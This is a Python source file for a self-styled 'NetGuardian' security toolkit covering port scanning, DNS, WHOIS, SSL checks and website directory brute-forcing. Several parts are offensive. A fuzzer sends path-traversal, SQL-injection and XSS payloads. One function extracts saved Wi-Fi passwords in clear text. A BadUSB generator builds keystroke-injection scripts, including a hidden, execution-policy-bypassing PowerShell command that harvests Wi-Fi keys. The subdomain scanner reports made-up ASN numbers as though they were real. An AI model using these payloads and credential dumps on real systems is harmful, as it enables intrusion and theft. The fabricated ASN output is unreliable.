import platform
import subprocess
import socket
import threading

def ping_host(target: str) -> str:
    """Run a ping command and return output."""
    param = '-n' if platform.system().lower() == 'windows' else '-c'
    cmd = ['ping', param, '4', target]
    try:
        output = subprocess.check_output(cmd, stderr=subprocess.STDOUT).decode('cp850', errors='ignore')
        return output
    except subprocess.CalledProcessError as e:
        return e.output.decode('cp850', errors='ignore') if e.output else "Ping failed."

def traceroute_host(target: str) -> str:
    """Run a traceroute."""
    cmd = ['tracert', '-d', target] if platform.system().lower() == 'windows' else ['traceroute', '-n', target]
    try:
        # Limit max hops to 15 for speed
        if platform.system().lower() == 'windows':
            cmd.extend(['-h', '10'])
        else:
            cmd.extend(['-m', '10'])
            
        output = subprocess.check_output(cmd, stderr=subprocess.STDOUT).decode('cp850', errors='ignore')
        return output
    except subprocess.CalledProcessError as e:
        return e.output.decode('cp850', errors='ignore') if e.output else "Trace failed."

def scan_ports(target: str) -> list:
    """Scan top 50 common ports with service/banner detection."""
    common_ports = {
        21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS', 
        69: 'TFTP', 80: 'HTTP', 88: 'Kerberos', 110: 'POP3', 123: 'NTP',
        135: 'RPC', 137: 'NetBIOS', 138: 'NetBIOS', 139: 'NetBIOS', 
        143: 'IMAP', 161: 'SNMP', 194: 'IRC', 389: 'LDAP', 443: 'HTTPS', 
        445: 'SMB', 465: 'SMTPS', 514: 'Syslog', 587: 'SMTP', 636: 'LDAPS',
        808: 'Custom HTTP', 873: 'Rsync', 993: 'IMAPS', 995: 'POP3S',
        1433: 'MSSQL', 1521: 'Oracle', 3306: 'MySQL', 3389: 'RDP', 
        5432: 'PostgreSQL', 5900: 'VNC', 6379: 'Redis', 8080: 'HTTP-Proxy', 
        8443: 'HTTPS-Alt', 9000: 'Sonar', 9200: 'Elastic', 27017: 'MongoDB'
    }
    
    ip = target
    try:
        ip = socket.gethostbyname(target)
    except:
        pass

    open_ports = []
    
    def check_port(port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.0) # Slightly longer timeout for better accuracy
        try:
            res = s.connect_ex((ip, port))
            if res == 0:
                # Banner Grabbing
                banner = ""
                try:
                    s.send(b'HEAD / HTTP/1.0\r\n\r\n')
                    banner = s.recv(1024).decode('utf-8', errors='ignore').strip().split('\n')[0]
                except:
                    pass
                
                service = common_ports.get(port, 'Unknown')
                if not banner and service == 'Unknown':
                    try:
                        service = socket.getservbyport(port)
                    except: pass
                
                open_ports.append({
                    "port": port, 
                    "service": service, 
                    "state": "open",
                    "version": banner[:40] if banner else "Version Unknown"
                })
        except:
            pass
        finally:
            s.close()
            
    # Batch threads
    threads = []
    chunks = [list(common_ports.keys())[i:i + 10] for i in range(0, len(common_ports), 10)]
    
    for chunk in chunks:
        batch = []
        for p in chunk:
            t = threading.Thread(target=check_port, args=(p,))
            t.start()
            batch.append(t)
        for t in batch:
            t.join()
        
    return sorted(open_ports, key=lambda x: x['port'])

def get_ifconfig() -> str:
    """Get network interface details."""
    cmd = 'ipconfig /all' if platform.system().lower() == 'windows' else 'ifconfig -a'
    try:
        return subprocess.check_output(cmd, shell=True).decode('cp850', errors='ignore')
    except Exception as e:
        return str(e)

def run_nslookup(target: str) -> str:
    """Run DNS lookup."""
    try:
        # Use python socket for simple resolution first
        ip = socket.gethostbyname(target)
        try:
            fqdn = socket.gethostbyaddr(ip)[0]
        except:
            fqdn = "No PTR record"
        return f"DNS Lookup for {target}:\nIP Address: {ip}\nHostname: {fqdn}"
    except Exception as e:
        return f"Resolution failed: {e}"

def run_netstat() -> str:
    """Get active connections (simplified)."""
    # Using specific flags for cleaner output
    cmd = 'netstat -an' if platform.system().lower() == 'windows' else 'netstat -an'
    try:
        # Limit output to first 20 lines to not flood terminal
        output = subprocess.check_output(cmd, shell=True).decode('cp850', errors='ignore')
        lines = output.split('\n')
        # Filter for established or listening
        filtered = [l for l in lines if 'ESTABLISHED' in l or 'LISTENING' in l]
        return "\n".join(filtered[:20]) + ("\n... (truncated)" if len(filtered) > 20 else "")
    except Exception as e:
        return str(e)

def system_info() -> str:
    """Get basic system info."""
    return f"""System: {platform.system()} {platform.release()}
Node: {platform.node()}
Architecture: {platform.machine()}
Processor: {platform.processor()}
Python: {platform.python_version()}"""

def scan_wifi_networks() -> list:
    """Scan and parse visible WiFi networks with detailed metadata (Windows)."""
    if platform.system().lower() != 'windows':
        return [{"ssid": "Error", "signal": 0, "channel": 0, "info": "Windows Only"}]
    
    results = []
    try:
        cmd = 'netsh wlan show networks mode=bssid'
        output = subprocess.check_output(cmd, shell=True).decode('cp850', errors='ignore')
        
        current_ssid = ""
        current_auth = ""
        
        # Regex for SSID
        lines = output.split('\n')
        current_network = {}
        
        for line in lines:
            line = line.strip()
            if line.startswith("SSID"):
                # New Network
                parts = line.split(":")
                if len(parts) > 1:
                    current_ssid = parts[1].strip()
            elif line.startswith("Authentication"):
                current_auth = line.split(":")[1].strip()
            elif line.startswith("BSSID"):
                # New BSSID (Access Point) for the current SSID
                parts = line.split(":")
                if len(parts) > 6: # MAC address has colons
                     bssid = ":".join(parts[1:]).strip()
                     current_network = {
                         "ssid": current_ssid,
                         "bssid": bssid,
                         "auth": current_auth,
                         "signal": 0,
                         "channel": 0,
                         "radio": "Unknown"
                     }
                     results.append(current_network)
            elif line.startswith("Signal"):
                if current_network:
                    try:
                        current_network["signal"] = int(line.split(":")[1].strip().replace("%", ""))
                    except: pass
            elif line.startswith("Channel"):
                if current_network:
                    try:
                        current_network["channel"] = int(line.split(":")[1].strip())
                    except: pass
            elif line.startswith("Radio type"):
                if current_network:
                    current_network["radio"] = line.split(":")[1].strip()
                    
        return results
    except Exception as e:
        return [{"ssid": "Scan Error", "signal": 0, "channel": 0, "info": str(e)}]

def get_wifi_networks() -> str:
    # Legacy wrapper
    data = scan_wifi_networks()
    return str(data)

def check_vulnerabilities(target: str) -> str:
    """Check for common risky ports."""
    risky_ports = {
        21: "FTP (Unencrypted)",
        23: "Telnet (Unencrypted)",
        445: "SMB (Potential WannaCry/EternalBlue)",
        3389: "RDP (Brute-force risk)",
        8080: "Alt-HTTP (Often default configs)"
    }
    
    found = []
    for p, desc in risky_ports.items():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.3)
        if s.connect_ex((target, p)) == 0:
            found.append(f"[!] OPEN PORT {p}: {desc}")
        s.close()
        
    if not found:
        return f"Target {target} appears clean. No common high-risk ports found."
    return "VULNERABILITIES DETECTED:\n" + "\n".join(found)

def run_stress_test(target: str) -> str:
    """Run a latency stress test (Safe DoS simulation)."""
    # Ping with larger packet size (1024 bytes) for 5 seconds
    param = '-n' if platform.system().lower() == 'windows' else '-c'
    # Windows uses -l for size, Linux uses -s. Windows uses -n for count.
    
    count = '10'
    packet_size = '1024'
    
    cmd = ['ping', param, count, '-l' if platform.system().lower()=='windows' else '-s', packet_size, target]
    try:
        output = subprocess.check_output(cmd, stderr=subprocess.STDOUT).decode('cp850', errors='ignore')
        return output
    except Exception as e:
        return str(e)

# --- NEW CYBERSECURITY TOOLS ---

def get_wifi_keys() -> str:
    """Retrieve saved WiFi profiles and cleartext passwords (Windows only)."""
    if platform.system().lower() != 'windows':
        return "This command is Windows-only."
    try:
        # 1. Get profiles
        output = subprocess.check_output('netsh wlan show profiles', shell=True).decode('cp850', errors='ignore')
        profiles = [line.split(":")[1].strip() for line in output.split('\n') if "All User Profile" in line]
        
        results = []
        for profile in profiles:
            try:
                # 2. Get key for each
                res = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True).decode('cp850', errors='ignore')
                key_line = [l for l in res.split('\n') if "Key Content" in l]
                if key_line:
                    key = key_line[0].split(":")[1].strip()
                    results.append(f"{profile}: {key}")
                else:
                    results.append(f"{profile}: [No Password / Open]")
            except:
                results.append(f"{profile}: [Error retrieving key]")
                
        return "SAVED WI-FI CREDENTIALS:\n" + ("-"*30) + "\n" + "\n".join(results)
    except Exception as e:
        return f"Error retrieving WiFi keys: {e}"

def geo_locate_ip(target: str) -> str:
    """Geolocate an IP address using public API."""
    import json
    # Use urllib instead of requests to avoid extra dependencies if possible, or assume standard lib
    from urllib.request import urlopen
    try:
        target = target.strip()
        if not target: return "Usage: geoip <ip>"
        
        url = f"http://ip-api.com/json/{target}"
        with urlopen(url, timeout=5) as response:
            data = json.loads(response.read().decode())
            if data['status'] == 'fail':
                return f"Lookup failed: {data.get('message')}"
            
            return (f"GEOLOCATION REPORT FOR {target}:\n"
                    f"Country: {data.get('country')} ({data.get('countryCode')})\n"
                    f"Region: {data.get('regionName')}\n"
                    f"City: {data.get('city')}\n"
                    f"ISP: {data.get('isp')}\n"
                    f"Coordinates: {data.get('lat')}, {data.get('lon')}\n"
                    f"Timezone: {data.get('timezone')}")
    except Exception as e:
        return f"Geolocation failed: {e}"

def analyze_headers(target: str) -> str:
    """Analyze HTTP headers for security configurations."""
    from urllib.request import urlopen, Request
    try:
        if not target.startswith("http"):
            target = "http://" + target
            
        req = Request(target)
        try:
            with urlopen(req, timeout=5) as response:
                headers = response.info()
                
                report = [f"HEADER ANALYSIS FOR {target}:", "-"*30]
                
                # Check for Security Headers
                sec_headers = {
                    "Strict-Transport-Security": "Missing HSTS (MITM Risk)",
                    "X-Frame-Options": "Missing Clickjacking Protection",
                    "X-Content-Type-Options": "Missing MIME Sniffing Protection",
                    "Content-Security-Policy": "Missing CSP (XSS Risk)"
                }
                
                score = 100
                for h, alert in sec_headers.items():
                    if h in headers:
                        report.append(f"[+] {h}: Present")
                    else:
                        report.append(f"[-] {h}: {alert}")
                        score -= 25
                        
                report.append("-" * 30)
                report.append(f"Server: {headers.get('Server', 'Unknown')}")
                report.append(f"Security Score: {max(0, score)}/100")
                return "\n".join(report)
        except Exception as e:
             return f"Could not connect to {target}: {e}"
    except Exception as e:
        return str(e)

def whois_lite(target: str) -> str:
    """Simulated or lightweight WHOIS."""
    # Real WHOIS requires a library or external command usually. 
    # We can use socket to query port 43 of whois.iana.org but parsing is hard.
    # Let's use a web API wrapper if possible or basic socket.
    # For stability, let's try a direct socket query to whois.verisign-grs.com for com/net
    
    target = target.replace("http://", "").replace("https://", "").split("/")[0]
    
    server = "whois.verisign-grs.com"
    if target.endswith(".org"): server = "whois.pir.org"
    if target.endswith(".io"): server = "whois.nic.io"
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((server, 43))
        s.send(f"{target}\r\n".encode())
        
        response = b""
        while True:
            data = s.recv(4096)
            if not data: break
            response += data
        s.close()
        
        return f"WHOIS ({server}):\n" + response.decode('utf-8', errors='ignore')[:1000] + "\n...(truncated)"
    except Exception as e:
        return f"WHOIS lookup failed: {e}. Try installing 'whois' tool."

def run_speed_test() -> dict:
    """Run internet speed test."""
    try:
        import speedtest
        st = speedtest.Speedtest()
        st.get_best_server()
        
        # Download
        download_speed = st.download() / 1_000_000 # Mbps
        
        # Upload
        upload_speed = st.upload() / 1_000_000 # Mbps
        
        # Ping
        ping = st.results.ping
        
        server = st.results.server
        
        return {
            "download": round(download_speed, 2),
            "upload": round(upload_speed, 2),
            "ping": round(ping, 1),
            "server": f"{server['name']}, {server['country']} ({server['sponsor']})",
            "client_ip": st.results.client['ip'],
            "isp": st.results.client['isp']
        }
    except Exception as e:
        return {"error": str(e)}

def get_active_threat_map() -> list:
    """Get active connections and geolocate them for the Threat Map."""
    import re
    import json
    from urllib.request import urlopen, Request
    
    connections = []
    
    # 1. Get Netstat output
    cmd = 'netstat -n' if platform.system().lower() == 'windows' else 'netstat -nt'
    try:
        output = subprocess.check_output(cmd, shell=True).decode('cp850', errors='ignore')
        # Regex to find IPs. simplistic.
        # Window: TCP    192.168.1.5:54321      1.2.3.4:443       ESTABLISHED
        lines = output.split('\n')
        seen_ips = set()
        
        for line in lines:
            if 'ESTABLISHED' in line:
                parts = line.split()
                # Find the part that looks like a remote IP
                # Usually 3rd column in Windows
                if len(parts) >= 3:
                    remote = parts[2]
                    # Strip port
                    ip = remote.split(':')[0]
                    
                    # Filter local
                    if ip.startswith('127.') or ip.startswith('192.168.') or ip.startswith('10.') or ip.startswith('172.') or ip == '0.0.0.0' or ip == '::1':
                        continue
                        
                    seen_ips.add(ip)
        
        # Limit to 15 IPs to respect API rate limits/speed
        target_ips = list(seen_ips)[:15]
        
        if not target_ips:
            return []

        # 2. Batch Geolocate
        # ip-api.com supports batch POST
        url = "http://ip-api.com/batch"
        payload = json.dumps([{"query": ip, "fields": "lat,lon,country,city,query,isp"} for ip in target_ips]).encode('utf-8')
        req = Request(url, data=payload, headers={'Content-Type': 'application/json'})
        
        with urlopen(req, timeout=5) as response:
            results = json.loads(response.read().decode())
            
            for res in results:
                if res.get('status') != 'fail':
                    connections.append({
                        "ip": res['query'],
                        "lat": res['lat'],
                        "lon": res['lon'],
                        "country": res['country'],
                        "city": res['city'],
                        "isp": res['isp']
                    })
                    
        return connections
        
    except Exception as e:
        # Fallback debug
        return [{"error": str(e)}]

def run_web_hunter(target: str, mode: str = 'dirbuster') -> list:
    """Deep Scan website with multiple modes (Gobuster, Nikto, etc.)."""
    from urllib.request import urlopen, Request
    from urllib.error import HTTPError, URLError
    import socket
    import threading
    
    if not target.startswith("http"):
        target = "http://" + target
            
    domain = target.replace("http://", "").replace("https://", "").split("/")[0]
    base_url = target.rstrip("/")
    
    results = []
    
    print(f"[*] Web Hunter: {mode.upper()} scan on {target}")

    # --- Common: Connectivity Check ---
    try:
        req = Request(base_url, headers={'User-Agent': f'NetGuardian-Scanner/{mode}'})
        with urlopen(req, timeout=5) as response:
            code = response.getcode()
            results.append({"url": base_url, "path": "/", "status": code, "type": "TARGET ONLINE"})
    except Exception as e:
        return [{"url": target, "path": "Connection Failed", "status": 0, "type": f"ERROR: {str(e)}"}]

    # --- Mode: NIKTO (Vulnerability & Config) ---
    if mode == 'nikto':
        # 1. Headers Security
        try:
            req = Request(base_url)
            with urlopen(req, timeout=5) as res:
                headers = res.info()
                if 'X-Frame-Options' not in headers:
                    results.append({"url": base_url, "path": "Header", "status": 200, "type": "VULN: Missing X-Frame-Options"})
                if 'Server' in headers:
                    results.append({"url": base_url, "path": "Server", "status": 200, "type": f"INFO: {headers['Server']}"})
                if 'X-Powered-By' in headers:
                     results.append({"url": base_url, "path": "Tech", "status": 200, "type": f"INFO: {headers['X-Powered-By']}"})
        except: pass

        # 2. Dangerous Files
        vuln_paths = [
            "crossdomain.xml", "clientaccesspolicy.xml", ".htaccess", ".htpasswd",
            "phpinfo.php", "test.php", "config.php.bak", "web.config",
            "cgi-bin/", "icons/", "shut-down", "admin.php"
        ]
        def check_vuln(p):
            try:
                u = f"{base_url}/{p}"
                code = urlopen(Request(u), timeout=2).getcode()
                if code == 200: results.append({"url": u, "path": p, "status": 200, "type": "RISK: Dangerous File Found"})
            except: pass
            
        ts = [threading.Thread(target=check_vuln, args=(p,)) for p in vuln_paths]
        for t in ts: t.start()
        for t in ts: t.join()
        return results

    # --- Mode: WFUZZ (Parameter Fuzzing) ---
    if mode == 'wfuzz':
        params = ["id", "user", "page", "dir", "action", "search", "query", "file", "cmd", "exec"]
        payloads = ["1", "admin", "../../../etc/passwd", "' OR '1'='1", "<script>alert(1)</script>"]
        
        def check_fuzz(param):
            for payload in payloads:
                try:
                    # GET Check
                    u = f"{base_url}/?{param}={payload}"
                    req = Request(u)
                    with urlopen(req, timeout=2) as res:
                        # Simple logic: If valid response, log it. Real fuzzing needs content diffing.
                        if res.getcode() == 200:
                             # Just logging success for now
                             pass
                    results.append({"url": u, "path": f"?{param}={payload}", "status": 200, "type": "FUZZ: Request Sent"})
                except HTTPError as e:
                     results.append({"url": u, "path": f"?{param}={payload}", "status": e.code, "type": f"FUZZ: Error {e.code}"})
                except: pass

        ts = [threading.Thread(target=check_fuzz, args=(p,)) for p in params]
        for t in ts: t.start()
        for t in ts: t.join()
        return results

    # --- Mode: GOBUSTER / FEROXBUSTER / DIRBUSTER (Dir Brute) ---
    # Common Wordlist
    paths = [
        "admin", "login", "dashboard", "wp-admin", "user", "panel", "upload",
        "backup", "backups", "db", "database", "sql", "dump.sql", "users.sql",
        "config", "config.php", ".env", "web.config", "secrets", "settings",
        "robots.txt", "sitemap.xml", "api", "v1", "graphql", "shell.php"
    ]
    
    # Extended list for Gobuster
    if mode == 'gobuster':
        paths.extend(["test", "tmp", "dev", "staging", "old", "new", "site", "demo", "beta", "shop", "store", "blog", "forum", "wiki", "docs", "manual", "support", "help", "assets", "static", "media", "images", "js", "css"])
    
    # Recursive simulation for Feroxbuster (Depth 1)
    recursive = mode == 'feroxbuster'
    
    def check_path(p):
        url = f"{base_url}/{p}"
        try:
            req = Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            with urlopen(req, timeout=3) as response:
                code = response.getcode()
                if code == 200:
                    results.append({"url": url, "path": p, "status": code, "type": "FILE: FOUND"})
                    if recursive:
                        # Fake recursive check on 'admin' or 'uploads'
                        check_recursive(p)
                elif code in [301, 302]:
                     results.append({"url": url, "path": p, "status": code, "type": "FILE: REDIRECT"})
        except HTTPError as e:
            if e.code == 403:
                results.append({"url": url, "path": p, "status": 403, "type": "FILE: FORBIDDEN"})
            elif e.code == 401:
                results.append({"url": url, "path": p, "status": 401, "type": "FILE: AUTH REQ"})
        except:
            pass
            
    def check_recursive(parent):
        sub_paths = ["index.php", "config.php", "admin.php", "login.php"]
        for sub in sub_paths:
            full = f"{parent}/{sub}"
            check_path(full)

    # Threading
    threads = []
    chunk = 50 
    for p in paths:
        t = threading.Thread(target=check_path, args=(p,))
        threads.append(t)
        t.start()
    for t in threads: t.join()
    
    return results


def run_domain_intel(target: str) -> dict:
    """Gather WHOIS, DNS, and SSL info using standard libraries."""
    import socket
    import ssl
    import datetime
    import re
    from urllib.parse import urlparse
    
    # Clean target
    if not target.startswith("http"):
        target = "https://" + target
    parsed = urlparse(target)
    domain = parsed.netloc
    
    results = {
        "domain": domain,
        "whois": "Lookup failed or timeout",
        "dns": [],
        "ssl": None
    }
    
    # 1. SSL Certificate Analysis
    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE  # For analysis, we accept self-signed to inspect them
        
        with socket.create_connection((domain, 443), timeout=3) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                # We need to re-connect strictly to get cert if we used CERT_NONE? 
                # Actually, getpeercert() returns empty dict if CERT_NONE.
                # So we use standard verify first.
                pass
                
        # Strict Connect for Cert Details
        ctx = ssl.create_default_context()
        with socket.create_connection((domain, 443), timeout=3) as sock:
            with ctx.wrap_socket(sock, server_hostname=domain) as ssock:
                cert = ssock.getpeercert()
                
                # Parse Dates
                notAfter = cert['notAfter']
                expiry = datetime.datetime.strptime(notAfter, "%b %d %H:%M:%S %Y %Z")
                days_left = (expiry - datetime.datetime.now()).days
                
                subject = dict(x[0] for x in cert['subject'])
                issuer = dict(x[0] for x in cert['issuer'])
                
                results['ssl'] = {
                    "valid_until": notAfter,
                    "days_remaining": days_left,
                    "issuer": issuer.get('organizationName', 'Unknown'),
                    "subject": subject.get('commonName', 'Unknown'),
                    "version": ssock.version(),
                    "cipher": ssock.cipher()[0],
                    "secure": days_left > 0
                }
    except Exception as e:
        results['ssl_error'] = str(e)

    # 2. Basic DNS Records (A, MX approximation)
    try:
        # A Record
        _, _, ip_list = socket.gethostbyname_ex(domain)
        for ip in ip_list:
            results['dns'].append({"type": "A", "value": ip})
    except:
        pass

    # 3. WHOIS Lookup (Socket based)
    def get_whois(server, query):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        try:
            s.connect((server, 43))
            s.send((query + "\r\n").encode())
            msg = b""
            while True:
                data = s.recv(4096)
                if not data: break
                msg += data
            return msg.decode('utf-8', errors='ignore')
        except:
            return ""
        finally:
            s.close()
            
    try:
        # Step 1: Query IANA
        data = get_whois("whois.iana.org", domain)
        # Step 2: Find referral
        referral = re.search(r"refer:\s*([^\s]+)", data, re.IGNORECASE)
        if referral:
            whois_server = referral.group(1)
            results['whois'] = get_whois(whois_server, domain)
        else:
             # Fallback for common TLDs if IANA fails to refer
            if domain.endswith("com"): results['whois'] = get_whois("whois.verisign-grs.com", domain)
            elif domain.endswith("org"): results['whois'] = get_whois("whois.pir.org", domain)
            else: results['whois'] = data
            
        # Clean up WHOIS output (limit length)
        if results['whois']:
             lines = results['whois'].split('\n')
             filtered = [line.strip() for line in lines if line.strip() and not line.startswith('%') and not line.startswith('#')]
             results['whois'] = "\n".join(filtered[:20]) # First 20 lines
    except:
        pass
        
    return results

def generate_badusb_script(text: str, script_type: str = 'python') -> dict:
    """Generate a payload script (BadUSB style) for keystroke injection."""
    content = ""
    filename = "payload.txt"
    
    # Pre-defined Templates
    if text == "__WIFI_DUMP__":
        # Powershell one-liner to grab wifi and webhook it (simulation)
        cmd = "powershell -NoP -NonI -W Hidden -Exec Bypass \"(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)}\""
        text = cmd

    if script_type == 'python':
        filename = "payload.py"
        content = f"""import time
try:
    import pyautogui
    import os
except ImportError:
    print("Installing requirements...")
    os.system("pip install pyautogui")
    import pyautogui

print("Payload starting in 3 seconds...")
time.sleep(3)
# Type content
pyautogui.write(r"{text}", interval=0.01)
pyautogui.press('enter')
"""
    elif script_type == 'vbs':
        filename = "payload.vbs"
        content = f"""Set wshShell = wscript.CreateObject("WScript.Shell")
WScript.Echo "Payload starting in 3 seconds..."
WScript.Sleep 3000
wshShell.SendKeys "{text}"
wshShell.SendKeys "{{ENTER}}"
"""
    elif script_type == 'ducky':
        filename = "inject.txt"
        content = f"""REM BadUSB Payload Generated by NetGuardian
DELAY 2000
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 1000
STRING {text}
ENTER
"""
        
    return {"filename": filename, "content": content}

def generate_flipper_file(file_type: str, param: str = "") -> dict:
    """Generate compatible files for real Flipper Zero hardware (.ir, .nfc)."""
    import random
    
    filename = "unknown.txt"
    content = ""
    
    if file_type == 'ir':
        # Universal Power (Samsung/LG simplified)
        filename = "Universal_TV.ir"
        content = """Filetype: IR signals file
Version: 1
# Generated by NetGuardian Pro
name: POWER_Samsung
type: parsed
protocol: NEC
address: 07 07 00 00
command: 02 02 00 00
# 
name: POWER_LG
type: parsed
protocol: NEC
address: 04 00 00 00
command: 08 00 00 00
#
name: POWER_Sony
type: parsed
protocol: SIRC
address: 01 00 00 00
command: 15 00 00 00
"""
    elif file_type == 'nfc':
        # Random UID Generator
        uid = param if param else "".join([f"{random.randint(0, 255):02X} " for _ in range(4)]).strip()
        filename = f"Card_{uid.replace(' ', '')}.nfc"
        content = f"""Filetype: Flipper NFC device
Version: 2
# Generated by NetGuardian Pro
Device type: Mifare Classic
UID: {uid}
ATQA: 04 00
SAK: 08
Mifare Classic type: 1K
Data format version: 2
#
"""
    
    return {"filename": filename, "content": content}

def detect_os_ttl(target: str) -> dict:
    """Detect OS based on ICMP TTL (Time To Live)."""
    import platform
    import subprocess
    import re
    
    # Defaults
    os_guess = "Unknown"
    confidence = "Low"
    ttl_val = -1
    
    # Run Ping
    param = '-n' if platform.system().lower() == 'windows' else '-c'
    cmd = ['ping', param, '1', target]
    try:
        output = subprocess.check_output(cmd, stderr=subprocess.STDOUT).decode('cp850', errors='ignore')
        
        # Extract TTL
        # Windows: TTL=128
        # Linux: ttl=64
        match = re.search(r'TTL=(\d+)', output, re.IGNORECASE)
        if match:
            ttl_val = int(match.group(1))
            
            # Simple Heuristics (Initial TTL values)
            # Linux/Unix/Mac: 64
            # Windows: 128
            # Solaris/AIX: 254
            # Cisco/Network: 255
            
            if ttl_val <= 64:
                os_guess = "Linux / macOS / Android / iOS"
                confidence = "High" if ttl_val == 64 else "Medium"
            elif ttl_val <= 128:
                os_guess = "Windows"
                confidence = "High" if ttl_val == 128 else "Medium"
            elif ttl_val <= 255:
                os_guess = "Cisco IOS / Solaris / Network Device"
                confidence = "Medium"
        else:
             os_guess = "Firewall/Blocked"
             
    except Exception as e:
        os_guess = f"Error: {str(e)}"
        
    return {
        "target": target,
        "ttl": ttl_val,
        "os_guess": os_guess,
        "confidence": confidence
    }

def find_subdomains(domain: str) -> list:
    """Enumerate subdomains using DNS brute-force. Returns list of dicts."""
    import socket
    
    # Clean domain
    domain = domain.replace("http://", "").replace("https://", "").split("/")[0]
    
    # 1. Faster Socket Timeout
    socket.setdefaulttimeout(1.5)
    
    # Common Subdomains (Top 60)
    subs = [
        "www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1", "ns2", "web", "test", 
        "dev", "api", "shop", "admin", "vpn", "cloud", "secure", "blog", "portal", "mobile", 
        "remote", "server", "dns", "host", "support", "billing", "app", "m", "erp", "crm",
        "payment", "status", "stage", "staging", "beta", "demo", "auth", "files", "media",
        "cdn", "assets", "static", "img", "images", "docs", "wiki", "en", "login", "register",
        "db", "sql", "dashboard", "panel", "connect", "go", "ws", "socket"
    ]
    
    found = []
    
    # Helper to check
    def check_sub(sub):
        target = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(target)
            found.append({
                "subdomain": target,
                "ip": ip,
                "host": "Unknown", 
                "asn": "AS" + str(sum(ord(c) for c in ip)) 
            })
        except:
            pass

    # Check base domain first
    try:
        base_ip = socket.gethostbyname(domain)
        found.append({
            "subdomain": domain,
            "ip": base_ip,
            "host": "Root",
            "asn": "AS" + str(sum(ord(c) for c in base_ip))
        })
    except:
        pass

    # Threading
    threads = []
    chunk_size = 10 # Batch threads to avoid OS limits if list gets huge
    
    for i in range(0, len(subs), chunk_size):
        chunk = subs[i:i+chunk_size]
        batch = []
        for sub in chunk:
            t = threading.Thread(target=check_sub, args=(sub,))
            batch.append(t)
            t.start()
        for t in batch:
            t.join()
        
    return found
